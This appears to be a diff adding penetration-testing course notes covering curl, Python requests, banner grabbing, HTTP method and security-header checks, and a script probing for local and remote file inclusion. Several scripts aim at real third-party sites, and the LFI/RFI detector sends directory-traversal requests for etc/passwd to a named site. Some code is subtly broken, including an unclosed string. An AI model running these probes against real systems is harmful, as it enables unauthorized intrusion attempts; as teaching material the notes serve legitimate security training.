@@ -1,0 +1,532 @@
+#############################
+# 1. Download a Single File #
+#############################
+The following command will get the content of the URL and display it in the STDOUT (i.e on your terminal).
+ 
+---------------------------Type This----------------------------------- 
+$ curl http://moneyloop.sa
+----------------------------------------------------------------------- 
+ 
+ 
+
+ 
+To store the output in a file, you an redirect it as shown below. This will also display some additional download statistics.
+ 
+---------------------------Type This----------------------------------- 
+$ curl http://moneyloop.sa > moneyloop.sa.html
+----------------------------------------------------------------------- 
+ 
+ 
+
+ 
+ 
+#####################################
+# 2. Save the cURL Output to a file #
+#####################################
+We can save the result of the curl command to a file by using -o/-O options.
+	•	-o (lowercase o) the result will be saved in the filename provided in the command line
+	•	-O (uppercase O) the filename in the URL will be taken and it will be used as the filename to store the result
+ 
+---------------------------Type This----------------------------------- 
+$ curl -o bye.txt http://www.opensource.apple.com/source/SpamAssassin/SpamAssassin-127.2/SpamAssassin/t/data/etc/hello.txt 
+----------------------------------------------------------------------- 
+ 
+ 
+
+Now the page hello.txt will be saved in the file named ‘bye.txt’. 
+You can also note that when running curl with -o option, it displays the progress meter for the download as follows.
+ 
+When you use curl -O (uppercase O), it will save the content in the file named ‘hello.txt’ itself in the local machine.
+ 
+---------------------------Type This----------------------------------- 
+$ curl -O http://www.opensource.apple.com/source/SpamAssassin/SpamAssassin-127.2/SpamAssassin/t/data/etc/hello.txt
+----------------------------------------------------------------------- 
+ 
+ 
+
+Note: When curl has to write the data to the terminal, it disables the Progress Meter, to avoid confusion in printing. We can use ‘>’|’-o’|’-O’ options to move the result to a file.
+ 
+##################################################
+# 3. Follow HTTP Location Headers with -L option #
+##################################################
+By default CURL doesn’t follow the HTTP Location headers. It is also termed as Redirects. When a requested web page is moved to another place, then an HTTP Location header will be sent as a Response and it will have where the actual web page is located.
+For example, when someone types google.com in the browser from India, it will be automatically redirected to ‘google.co.in’. This is done based on the HTTP Location header as shown below.
+ 
+---------------------------Type This----------------------------------- 
+$ curl -k --head https://www.moneyloop.sa			You'll see that you only get the 301
+ 
+$ curl -k --head -L https://www.moneyloop.sa		You'll see that you get the 301, and the 200 OK
+-----------------------------------------------------------------------
+ 
+##########################################
+# 4. Continue/Resume a Previous Download #
+##########################################
+Using curl -C option, you can continue a download which was stopped already for some reason. This will be helpful when you download large files, and the download got interrupted.
+If we say ‘-C -‘, then curl will find from where to start resuming the download. We can also give an offset ‘-C <offset>’. The given offset bytes will be skipped from the beginning for the source file.
+Start a big download using curl, and press Ctrl-C to stop it in between the download.
+ 
+---------------------------Type This----------------------------------- 
+$ curl -O http://swreflections.blogspot.com/2015/05/appsec-gaps-between-builders-and.html
+##############             20.1%
+Note: -# is used to display a progress bar instead of a progress meter.
+Now the above download was stopped at 20.1%. Using “curl -C -“, we can continue the download from where it left off earlier. Now the download continues from 20.1%.
+ 
+---------------------------Type This----------------------------------- 
+$ curl -C - -O http://swreflections.blogspot.com/2015/05/appsec-gaps-between-builders-and.html
+###############            21.1%
+----------------------------------------------------------------------- 
+ 
+ 
+
+#########################
+# Interacting with APIs #
+#########################
+
+Reference link:
+https://www.nylas.com/blog/use-python-requests-module-rest-apis/
+
+
+ 
+---------------------------Type This-----------------------------------
+$ curl -X GET "http://api.open-notify.org/astros.json"
+
+$ pip install requests
+
+
+$ python3
+>>> import requests
+>>> response = requests.get("http://api.open-notify.org/astros.json")
+>>> print(response)
+
+>>> response.content 				# Return the raw bytes of the data payload
+>>> response.text 					# Return a string representation of the data payload
+>>> response.json 					# This method is convenient when the API returns JSON
+
+
+>>> query = {'lat':'45', 'lon':'180'}
+>>> response = requests.get('http://api.open-notify.org/iss-pass.json', params=query)
+>>> print(response.json())
+
+
+# Create a new resource
+ 
+---------------------------Type This-----------------------------------
+$ python3
+>>> response = requests.post('https://httpbin.org/post', data = {'key':'value'})
+-----------------------------------------------------------------------
+
+
+# Update an existing resource
+ 
+---------------------------Type This-----------------------------------
+>>> requests.put('https://httpbin.org/put', data = {'key':'value'})
+
+
+>>> print(response.headers["date"])
+-----------------------------------------------------------------------
+
+
+
+
+>>> my_headers = {'Authorization' : 'Bearer {access_token}'}
+>>> response = requests.get('http://httpbin.org/headers', headers=my_headers)
+
+
+>>> session = requests.Session()
+>>> session.headers.update({'Authorization': 'Bearer {access_token}'})
+>>> response = session.get('https://httpbin.org/headers')
+
+
+>>> if (response.status_code == 200):
+...     print("The request was a success!")
+... elif (response.status_code ==404):
+...     print("Result not found!")
+... 
+
+
+>>> try:
+...     response = requests.get('http://api.open-notify.org/astros.json')
+...     response.raise_for_status()
+... except requests.exceptions.HTTPError as error:
+...     print(error)
+
+
+>>> try:
+...     response = requests.get('http://api.open-notify.org/astros.json')
+...     response.raise_for_status()
+... except requests.exceptions.TooManyRedirects as error:
+...     print(error)
+...
+
+
+>>> response = requests.get('http://api.open-notify.org/astros.json', max_redirects=2)
+
+
+>>> response = requests.get('http://api.open-notify.org/astros.json', allow_redirects=False)
+
+>>> try:
+...     response = requests.get('http://api.open-notify.org/astros.json') 
+    # Code here will only run if the request is successful
+>>> except requests.ConnectionError as error:
+...     print(error)
+
+
+>>> try:
+...     response = requests.get('http://api.open-notify.org/astros.json', timeout=0.00001)
+    # Code here will only run if the request is successful
+>>> except requests.Timeout as error:
+...     print(error)
+
+
+>>> try:
+...     response = requests.get('http://api.open-notify.org/astros.json', timeout=5)
+...     response.raise_for_status()
+>>> except requests.exceptions.HTTPError as errh:
+...     print(errh)
+>>> except requests.exceptions.ConnectionError as errc:
+...     print(errc)
+>>> except requests.exceptions.Timeout as errt:
+...     print(errt)
+>>> except requests.exceptions.RequestException as err:
+...     print(err)
+exit()
+-------------------------------------------------------------
+
+
+
+
+
+
+################################
+# Web App Testing with Python3 #
+################################
+
+
+ 
+ 
+ 
+ 
+##############################
+# Bannergrabbing a webserver #
+##############################
+ 
+---------------------------Type This-----------------------------------
+nano bannergrab.py
+ 
+ 
+---------------------------Paste This----------------------------------
+ 
+#!/usr/bin/env python3
+import sys
+import socket
+ 
+# Great reference: https://www.mkyong.com/python/python-3-typeerror-cant-convert-bytes-object-to-str-implicitly/
+ 
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("150.230.48.46", 80))
+s.send(("GET / HTTP/1.1\r\n\r\n").encode())
+ 
+#Convert response to bytes
+response = b""
+# or use encode()
+#response = "".encode()
+ 
+while True:
+    data = s.recv(4096)
+    response += data
+    if not data:
+        break
+s.close()
+print(response.decode())
+-----------------------------------------------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+$ python3 bannergrab.py
+-----------------------------------------------------------------------
+ 
+ 
+ 
+########################################
+# Testing availability of HTTP methods #
+########################################
+ 
+A  very  good  practice  for  a  penetration  tester  is  to  start  by  listing  the  various  available HTTP methods.
+Following is a Python script with the help of which we can connect to the target web server and enumerate the available HTTP methods:  
+ 
+To begin with, we need to import the requests library:
+ 
+---------------------------
+$ python3
+>>> import requests
+---------------------------
+ 
+After importing the requests library,create an array of HTTP methods, which we are going to send. We will make use ofsome standard methods like 'GET', 'POST', 'PUT', 'DELETE', 'OPTIONS' and a non-standard method ‘TEST’ to check how a web server can handle the unexpected input.
+ 
+----------------------------------------------------------------------------
+>>> method_list = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'TRACE','TEST']
+----------------------------------------------------------------------------
+ 
+The following line of code is the main loop of the script, which will send the HTTP packets to the web server and print the method and the status code.
+ 
+------------------------------------------------------
+>>> for method in method_list:
+...    req = requests.request(method, 'https://www.google.com')
+...    print (method, req.status_code, req.reason)
+------------------------------------------------------
+ 
+ 
+------------------------------------------------------
+>>> for method in method_list:
+...    req = requests.request(method, 'https://www.darkoperator.com')
+...    print (method, req.status_code, req.reason)
+------------------------------------------------------
+ 
+ 
+------------------------------------------------------
+>>> for method in method_list:
+...    req = requests.request(method, 'http://ms.dkes.ntpc.edu.tw/phpinfo.php')
+...    print (method, req.status_code, req.reason)
+------------------------------------------------------
+ 
+ 
+------------------------------------------------------
+>>> for method in method_list:
+...    req = requests.request(method, 'http://www.dybedu.com')
+...    print (method, req.status_code, req.reason)
+------------------------------------------------------
+ 
+ 
+The next line will test for the possibility of cross site tracing (XST) by sending the TRACE method.
+ 
+-------------------------------------------------------------
+>>> if method == 'TRACE' and 'TRACE / HTTP/1.1' in req.text:
+...    print ('Cross Site Tracing(XST) is possible')
+...    exit()
+-------------------------------------------------------------
+ 
+ 
+*** Full code with example url: ***
+ 
+---------------------------Type This-----------------------------------
+$ nano xst.py
+ 
+ 
+---------------------------Paste This----------------------------------
+#!/usr/bin/env python3
+import requests
+method_list = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'TRACE','TEST']
+for method in method_list:
+   req = requests.request(method, 'http://ms.dkes.ntpc.edu.tw/phpinfo.php')
+   print (method, req.status_code, req.reason)
+if method == 'TRACE' and 'TRACE / HTTP/1.1' in req.text:
+   print ('Cross Site Tracing(XST) is possible')
+ 
+-------------------------------------------------------------------------
+ 
+ 
+After running the above script for a particular web server, we will get 200 OK responses for a particular method accepted by the web server. We will get a 403 Forbidden response if the web server explicitly denies the method. Once we send the TRACE method for testing cross  site  tracing  (XST), we  will  get 405  Not  Allowed responses  from  the  web  server otherwise we will get the message ‘Cross Site Tracing(XST) is possible’.
+ 
+ 
+---------------------------Type This-----------------------------------
+$ python3 xst.py
+-----------------------------------------------------------------------
+ 
+ 
+ 
+##########################################
+# Foot printing by checking HTTP headers #
+##########################################
+ 
+ 
+HTTP headers are found in both requests and responses from the web server. They also carry very important information about servers. That is why penetration tester is always interested in parsing information through HTTP headers. Following is a Python script for getting the information about headers of the web server:
+ 
+To begin with, let us import the requests library:
+ 
+------------------------
+$ python3
+
+>>> import requests
+------------------------
+ 
+We need to send a  GET request to the web  server. The following line  of code makes a simple GET request through the requests library.
+ 
+---------------------------------------------
+>>> request = requests.get('enter the URL')
+---------------------------------------------
+ 
+Next, we will generate a list of headers about which you need the information.
+ 
+---------------------------------------------------------------------------------------------------------------
+>>> header_list = ['Server', 'Date', 'Via', 'X-Powered-By', 'X-Country-Code', 'Connection', 'Content-Length']
+---------------------------------------------------------------------------------------------------------------
+ 
+Next is a try and except block.
+ 
+---------------------------------------------------
+>>> for header in header_list:
+ 
+   try:
+      result = request.headers[header]
+      print ('%s: %s' % (header, result))
+   except Exception as err:
+         print ('%s: No Details Found' % header)
+ 
+---------------------------------------------------
+ 
+ 
+ 
+ 
+*** Example Full Code: ***
+ 
+---------------------------Type This-----------------------------------
+$ nano headercheck.py
+ 
+ 
+---------------------------Paste This----------------------------------
+#!/usr/bin/env python3
+import requests
+request = requests.get('http://ms.dkes.ntpc.edu.tw/phpinfo.php)
+header_list = ['Server', 'Date', 'Via', 'X-Powered-By', 'X-Country-Code', 'Connection', 'Content-Length']
+for header in header_list:
+      try:
+         result = request.headers[header]
+         print ('%s: %s' % (header, result))
+      except Exception as err:
+               print ('%s: No Details Found' % header)
+----------------------------------------------------------------------------------------------------------------
+ 
+ 
+After running the above script for a particular web server, we will get the information about the  headers  provided  in  the  header  list.  If  there  will  be  no  information  for  a  particular header then it will give the message ‘No Details Found’.
+ 
+ 
+---------------------------Type This-----------------------------------
+$ python3 headercheck.py
+-----------------------------------------------------------------------
+ 
+ 
+##############################################
+# Testing insecure web server configurations #
+##############################################
+ 
+We can use HTTP header information to test insecure web server configurations. In the following Python script, we are going to use try/except block to test insecure web server headers for number of URLs that are saved in a text file name websites.txt.
+---------------------------Type This-----------------------------------
+$ nano websites.txt
+ 
+---------------------------Paste This----------------------------------
+https://www.google.com
+https://www.cnn.com
+https://foxnews.com
+https://infosecaddicts.com/
+https://www.cyberme.studio/
+https://trusted.sa/
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+$ nano insecure_config_check.py
+ 
+ 
+---------------------------Paste This----------------------------------
+#!/usr/bin/env python3
+ 
+# Reference: https://www.keycdn.com/blog/http-security-headers
+ 
+import requests
+urls = open("websites.txt", "r")
+for url in urls:
+   url = url.strip()
+   req = requests.get(url)
+   print (url, 'report:')
+   try:
+      protection_xss = req.headers['X-XSS-Protection']
+      if protection_xss != '1; mode=block':
+         print ('X-XSS-Protection not set properly, it may be possible:', protection_xss)
+   except:
+      print ('X-XSS-Protection not set, it may be possible')
+   try:
+      options_content_type = req.headers['X-Content-Type-Options']
+      if options_content_type != 'nosniff':
+         print ('X-Content-Type-Options not set properly:', options_content_type)
+   except:
+      print ('X-Content-Type-Options not set')
+   try:
+      transport_security = req.headers['Strict-Transport-Security']
+   except:
+      print ('HSTS header not set properly, Man in the middle attacks is possible')
+   try:
+      content_security = req.headers['Content-Security-Policy']
+      print ('Content-Security-Policy set:', content_security)
+   except:
+      print ('Content-Security-Policy missing')
+ 
+-----------------------------------------------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+$ python3 insecure_config_check.py
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+$ nano LFI-RFI.py
+ 
+ 
+---------------------------Paste This----------------------------------
+ 
+#!/usr/bin/env python3
+print("\n### PHP LFI/RFI Detector ###")
+ 
+import urllib.request, urllib.error, urllib.parse,re,sys
+ 
+TARGET = "https://www.mycni.hk/cniuat/index.php?page=Carp:Misc&f_id=10075&target=Right"
+RFIVULN = "https://raw.githubusercontent.com/gruntjs/grunt-contrib-connect/master/test/fixtures/hello.txt?"
+TravLimit = 12
+ 
+print("==> Testing for LFI vulns..")
+TARGET = TARGET.split("=")[0]+"="               ## URL MANUPLIATION
+for x in range(1,TravLimit):                    ## ITERATE THROUGH THE LOOP
+   TARGET += "../"
+   try:
+       source = urllib.request.urlopen((TARGET+"etc/passwd%00")).read().decode() ## WEB REQUEST
+   except urllib.error.URLError as e:
+       print("$$$ We had an Error:",e)
+       sys.exit(0)
+   if re.search("root:x:0:0:",source):          ## SEARCH FOR TEXT IN SOURCE
+       print("!! ==> LFI Found:",TARGET+"etc/passwd")
+       break ## BREAK LOOP WHEN VULN FOUND
+ 
+print("\n==> Testing for RFI vulns..")
+TARGET = TARGET.split("=")[0]+"="+RFIVULN       ## URL MANUPLIATION
+try:
+   source = urllib.request.urlopen(TARGET).read().decode() ## WEB REQUEST
+except urllib.error.URLError as e:
+   print("$$$ We had an Error:",e)
+   sys.exit(0)
+if re.search("Hello world",source):             ## SEARCH FOR TEXT IN SOURCE
+   print("!! => RFI Found:",TARGET)
+   
+print("\nScan Complete\n")                      ## DONE
+----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+$ python3 LFI-RFI.py
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+ 
